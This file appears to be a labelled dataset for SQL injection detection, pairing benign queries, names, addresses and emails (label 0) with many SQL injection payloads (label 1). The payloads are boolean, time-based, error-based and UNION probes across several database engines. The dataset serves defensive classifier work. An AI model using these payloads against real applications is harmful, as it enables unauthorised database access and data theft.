Query,Label
SELECT * FROM history FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM seldom,0
calle bendicion 160,0
-2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,1
"  UPDATE road SET separate =  'particular', City =  'freedom' WHERE chapter =  favorite",0
SELECT TOP 3 * FROM aware WHERE after = 'doing',0
SELECT * FROM cowboy 3,0
SELECT * FROM farm WHERE fruit IN  ( SELECT about FROM getting ) ,0
"SELECT term_id, meta_key, meta_value FROM wp_termmeta WHERE term_id IN  ( 2712,3146,3152,2720,3078,2766,2679 )  ORDER BY meta_id ASC",0
"jose gomez gallito, 107,",0
quiles,0
-5147 or   (  8459  =  8459  )  *4906,1
"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",1
94987112x,0
"1%""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
fredes damas,0
SELECT COUNT ( DISTINCT golden )  FROM poetry,0
-8341 or 8571  =  8571--,1
37655511a,0
nalbach0@softwaremasservicio.aero,0
SELECT AVG ( planning ) FROM language SELECT SUM ( sense ) ,0
SELECT * FROM harbor WHERE up = 'rise' FETCH FIRST 3 ROWS ONLY,0
mccowen@esencialser.mn,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""kngx"" like ""kngx",1
"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",1
toolbox,0
select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"-4373%""   )    )    or 5672  =  5188--",1
3.38196E+14,0
FROM  ( SELECT DISTINCT combination FROM sight ) ,0
"   SELECT grabbed,ten,clay,almost,one     (  (  cake JOIN cattle ON steep.worried =  not.seeing )   INNER JOIN stormON Orders.did =  film.wrappedID ) ",0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",1
ten.tar,0
"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",1
siefert,0
SELECT COUNT ( even ) FROM storm,0
55950989q,0
SELECT * FROM particularly WHERE field BETWEEN up09/01/1996eat AND interest15/31/1996branch,0
"  SELECT NULLIF ( 25, 25 ) ;",0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82c5dbb23' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
-7111' or   (  8459  =  8459  )  *4906,1
nicole-meyer@creacionesdolcevita.us,0
pagny@cpanelweb.yu,0
88356550a,0
 UPDATE away SET glad = 'riding'WHERE purple = 'suppose',0
"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'hpbt'  =  'hpbt",1
SELECT TOP 3 * FROM lie WHERE manner = 'happy' SELECT * FROM get,0
DELETE FROM speech WHERE move = 'coat',0
FROM  ( SELECT DISTINCT ancient FROM band ) ,0
SELECT tower FROM four UNION ALL SELECT stop FROM allow ORDER BY memory,0
SELECT * FROM fewer WHERE care IN  ( SELECT thank FROM were ) ,0
"1' in boolean mode  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",1
SELECT * FROM highway WHERE    NOT exact = 'percent',0
SELECT * FROM whistle WHERE hungry IN  ( SELECT familiar FROM process ) ,0
"1""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
1'   )    )    as hqhs where 5383  =  5383,1
1   )    )    as ndrh where 6308  =  6308,1
muthuswa,0
"1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1'||  (  select 'ejuu' from dual where 2903  =  2903 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1
SELECT * FROM across FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM reason,0
"c/ juan rabadan 27, 6?a",0
"-6294"" union all select 9921,9921,9921,9921,9921,9921--",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262311 )  ORDER BY meta_id ASC",0
"  SELECT * FROM library WHERE slip IN  ( 'vapor', 'tube', 'area' )  ",0
"1  )   where 2020  =  2020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT * FROM all WHERE paint BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT between ( s )  FROM section SELECT sides FROM managed,0
SELECT COUNT ( flame ) FROM cause,0
"1'  )   union all select null,null,null,null--",1
munbrega,0
1%'   )    )     ) ,1
SELECT * FROM rest ORDER BY constantly,0
37541,0
SELECT * FROM look WHERE specific = 'such' FETCH FIRST 3 ROWS ONLY,0
"aldea de san nicols, la",0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""fkmh""  =  ""fkmh",1
SELECT supply,0
SELECT * FROM equally WHERE crew BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM above,0
"1  )   where 4698  =  4698 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
" SELECT column_name ( s )  FROM vowel,softly",0
8.73E+15,0
 or 1 in   (  select @@version  )  --,1
SELECT AVG ( poet ) FROM spin,0
rabanal morante,0
SELECT * FROM stay ORDER BY kind DESC,0
select sleep  (  5  )  # wihl,1
"1""  )   as ivkw where 4218  =  4218 union all select null--",1
93254282t,0
encrasar,0
SELECT differ ( s )  FROM hall,0
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'cfzp' like 'cfzp",1
"  SELECT whereID AS ID, which AS passage FROM bill",0
SELECT * FROM stared WHERE bottom = 'grandmother' FETCH FIRST 3 ROWS ONLY,0
 (  sqlvuln  ) ,1
francisco jorquera s/n 1?d,0
entwistle_ruetting@comonuevo.ro,0
"1%""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""%""  =  """,1
49718,0
"1,  (  select   (  case when   (  6857  =  7623  )   then 1 else 6857*  (  select 6857 from information_schema.character_sets  )   end   )    )   ",1
SELECT TOP 3 * FROM quiet,0
"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
burg,0
"   SELECT COUNT ( again ) , won FROM citizen BY thick",0
" SELECT * FROM continent ORDER BY donkey ASC, eaten DESC",0
verdusco,0
4077,0
ratnam,0
SELECT chance ( s )  FROM in SELECT worker ( s ) ,0
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""jfgk"" like ""jfgk",1
"-9854  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  5696  =  5696",1
"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT TOP 50 PERCENT * FROM mother,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
-3750'+  (  select alpu where 3911  =  3911 order by 1--,1
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""hkjf""  =  ""hkjf",1
SELECT * FROM beginning WHERE fell NOT LIKE '[recently]%',0
"  SELECT about,bigger FROM began WHERE vote = 'wire' UNION SELECT captain, essential FROM growth",0
SELECT * FROM fly WHERE nails = 'layers' FETCH FIRST 3 ROWS ONLY,0
38182378d,0
bolvir,0
1'   )    )     ) ,1
"port fangos, 183,",0
  )   or   (  'a'  =  'a,1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  # sipo,1
1'  )   where 8776  =  8776 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
" select * from users where id  =  1 or 1#""1 union select version  (    )  ,version  (    )   -- 1",1
"  SELECT MAKETIME ( 21,   59, 59 ) ;",0
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ylit' like 'ylit",1
SELECT * FROM large  WHERE see NOT LIKE '[mysterious]%',0
SELECT TOP 3 * FROM drawn WHERE feel = 'gulf' SELECT * FROM six,0
SELECT DISTINCT corner FROM shore,0
1'||  (  select 'fven' where 1433  =  1433 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||',1
SELECT * FROM combine WHERE bend NOT BETWEEN 'pictured' AND 'evidence',0
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,1
SELECT system ( s )  FROM dirt SELECT whose FROM pictured,0
SELECT AVG ( stopped ) FROM lay,0
"1  )   where 5598  =  5598 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"-1591 where 3291  =  3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",1
capaz9,0
38623329g,0
"-7676""   )    )    as flov where 7967  =  7967 union all select 7967--",1
"-1139  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
SELECT * FROM truck 3,0
-3062'   )    )    or 6872  =  6872 and    (    (   'uzth' like 'uzth,1
SELECT * FROM fell WHERE gulf = 'bee',0
1'+  (  select 'jmdl' where 7827  =  7827,1
"1""  )   where 4822  =  4822 union all select null,null,null,null,null,null,null,null,null,null--",1
"-1907""   )    )    or 2782  =  3591",1
SELECT TOP 3 * FROM wooden SELECT * FROM moving 3SELECT * FROM wonderful,0
"  SELECT sitID AS ID, drop AS reach FROM care",0
SELECT * FROM fewer,0
select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
1'||  (  select 'sdll' where 5074  =  5074 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',1
SELECT TOP 50 PERCENT * FROM western,0
calle arins 87 4?e,0
ballobar,0
-1714' union all select 6687--,1
SELECT * FROM pen FETCH FIRST 50 PERCENT ROWS ONLY,0
" SELECT * FROM track ORDER BY mix, discuss",0
SELECT zulu ( s )  FROM worried SELECT history FROM crack,0
adgardo,0
SELECT * FROM film WHERE worse  BETWEEN 10 AND 20,0
SELECT MIN ( without )  AS pool FROM mental,0
SELECT COUNT ( education ) FROM memory,0
matacandelas,0
SELECT division ( s )  FROM satisfied UNION,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3781 )  ORDER BY meta_id ASC",0
SELECT * FROM advice WHERE curve IN  ( SELECT mice FROM though ) ,0
idelfonsa,0
-3105' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'srep'  =  'srep,1
 )   or sleep  (  __TIME__  )    =  ',1
"-2167'   )    )     )   union all select 3804,3804,3804,3804,3804,3804#",1
"-2394'  )   union all select 1650,1650,1650,1650,1650,1650,1650--",1
 (  case when 2646  =  8520 then 2646 else null end  ) ,1
"1"" where 4066  =  4066 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
SELECT * FROM every FETCH FIRST 3 ROWS ONLY,0
"-4319""  )   where 7534  =  7534 or 8246  =  3217",1
"INSERT INTO more  ( relationship, why, hand )  VALUES  ( 'empty', 'expect', 'war' )  ",0
c8nde9a,0
SELECT * FROM fell WHERE adjective = 'several',0
4364,0
"  UPDATE football SET offer =  'tomorrow', City =  'due' WHERE after =  exchange",0
4.81564E+15,0
4.10842E+15,0
"  SELECT Orders.distancerID, Employees.said, Employees.sleep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.memoryID ORDER BY Orders.rememberID",0
6287,0
lugar grela 152 1?f,0
SELECT COUNT ( cottonID ) FROM changing,0
"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",1
SELECT TOP 3 * FROM simple WHERE especially = 'frame' SELECT * FROM kind,0
SELECT say ( s )  FROM camera FULL OUTER JOIN,0
"SELECT * FROM himself WHERE worker BETWEEN ""powder"" AND    ""move""",0
SELECT * FROM  ( SELECT motion FROM wolf ) ,0
 UPDATE drink SET ability = 'court'WHERE twice = 'union',0
el-hawar,0
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1
"1"" and elt  (  4249  =  4249,7259  )  ",1
SELECT * FROM particularly WHERE unless BETWEEN 'heavy' AND 'push',0
"1' and elt  (  4249  =  4249,7259  )   and 'awjd'  =  'awjd",1
"-2417  )   union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",1
artenio,0
olmos de esgueva,0
SELECT * FROM  ( SELECT wrapped FROM recall ) ,0
calle tras do colexio s/n,0
select   (  case when   (  2914  =  3335  )   then 2914 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
SELECT * FROM bound,0
"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
select pg_sleep  (  5  )   and 'zfyy'  =  'zfyy,1
" select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",1
SELECT rose ( s FROM glass RIGHT JOIN,0
n89m3nd2,0
valverde de alcal,0
1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,1
FROM  ( SELECT DISTINCT wealth FROM planet ) ,0
1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   # mekk,1
"-3829%""  )   union all select 2218,2218,2218,2218,2218,2218,2218--",1
vallart casabella,0
"1"" and make_set  (  8262  =  3471,3471  )   and ""wayp""  =  ""wayp",1
SELECT COUNT ( DISTINCT matter )  FROM several,0
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'uqfs'  =  'uqfs,1
"  SELECT Orders.fifteenrID, Employees.attempt, Employees.date FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.forestID ORDER BY Orders.anywayID",0
"1""  )   where 2570  =  2570 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM indeed WHERE travel = 'lion',0
FROM  ( SELECT DISTINCT solar FROM cotton ) ,0
SELECT * FROM somehow  WHERE soldier = fairly,0
SELECT so ( s )  FROM love FULL OUTER JOIN,0
select * from users where id  =  1 +1 or 1  =  1 -- 1,1
" SELECT column_name ( s )  FROM task,wolf",0
SELECT * FROM trade,0
45681,0
"1"" union all select null,null,null,null--",1
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'tnvm' like 'tnvm",1
1'  )   and 4595  =  4595#,1
"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'zizo' like 'zizo",1
SELECT COUNT ( fliesID ) FROM grandfather,0
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'diyb' like 'diyb,1
SELECT * FROM importance ORDER BY stone DESC,0
SELECT hit ( s )  FROM smile FULL OUTER JOIN,0
"1' and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
isurieta llano,0
parolero,0
"  SELECT Orders.softlyrID, Employees.forgotten, Employees.keep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.electricityID ORDER BY Orders.cleanID",0
carbonell calvet,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",1
SELECT * FROM judge FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM troops,0
81177297q,0
SELECT secret ( s FROM must RIGHT JOIN,0
"1'  )   union all select null,null,null,null,null,null,null--",1
DELETE FROM electric WHERE remarkable = 'drew',0
1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'mgfd'  =  'mgfd,1
 or sleep  (  __TIME__  )    =  ',1
crip3gama,0
SELECT * FROM strange WHERE NOT atom = 'has'  AND NOT tide = 'twenty',0
"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-5058%' union all select 6789,6789,6789,6789,6789#",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8671 )  ORDER BY meta_id ASC",0
geldres pittaluga,0
"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",1
"1'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",1
SELECT early ( s )  FROM population UNION ALL,0
bonfiglio cabanas,0
5.40E+15,0
SELECT * FROM will  WHERE safety = floating,0
"1""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"  SELECT * FROM let WHERE plural IN  ( 'oil', 'hang', 'fifty' )  ",0
"SELECT * FROM differ WHERE signal BETWEEN ""living"" AND    ""arrangement""",0
select sleep  (  5  )  #,1
SELECT * FROM cap WHERE shape BETWEEN lie09/01/1996blanket AND farmer15/31/1996position,0
SELECT * FROM flies  WHERE bit = four,0
SELECT * FROM rubber 3 SELECT * FROM average,0
"1'   )    )    union all select null,null,null,null,null,null,null,null--",1
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1
SELECT * FROM this 3,0
